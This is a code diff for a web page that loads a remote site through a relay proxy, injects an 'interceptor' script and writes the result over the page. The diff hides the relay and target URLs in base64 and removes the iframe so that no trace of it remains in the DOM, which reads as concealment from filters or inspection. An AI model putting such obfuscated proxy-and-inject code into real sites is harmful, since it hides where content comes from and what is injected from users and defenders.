@@ -14,11 +14,6 @@ html, body {
   color: #fff;
   font-family: sans-serif;
 }
-#x1 {
-  width: 100%;
-  height: 100%;
-  border: none;
-}
 #x2 {
   position: absolute;
   top: 50%;
@@ -29,15 +24,18 @@ html, body {
 </head>
 <body>
 <div id="x2">Loading...</div>
-<iframe id="x1"></iframe>
 <script>
 (function() {
   function decodeBase64(str) {
     return decodeURIComponent(escape(atob(str)));
   }
 
-  const relayBase = "https://logistical-utilities.vercel.app";
-  const targetOrigin = "https://core-logic-utils.github.io";
+  // Base64 encoded target endpoints
+  const encodedRelay = "aHR0cHM6Ly9sb2dpc3RpY2FsLXV0aWxpdGllcy52ZXJjZWwuYXBw";
+  const encodedTarget = "aHR0cHM6Ly9jb3JlLWxvZ2ljLXV0aWxzLmdpdGh1Yi5pbw==";
+
+  const relayBase = decodeBase64(encodedRelay);
+  const targetOrigin = decodeBase64(encodedTarget);
 
   const proxyUrl = relayBase + "/api/relay?url=" + encodeURIComponent(targetOrigin);
 
@@ -47,8 +45,6 @@ html, body {
       return response.text();
     })
     .then(function(html) {
-      document.getElementById("x2").style.display = "none";
-        
       const interceptor = `
       <script>
       (function() {
@@ -108,7 +104,10 @@ html, body {
           processed = interceptor + '\n' + processed;
       }
 
-      document.getElementById("x1").srcdoc = processed;
+      // Overwrites top document directly; no iframe node remains in the DOM tree
+      document.open();
+      document.write(processed);
+      document.close();
     })
     .catch(function(err) {
       console.log("error", err);
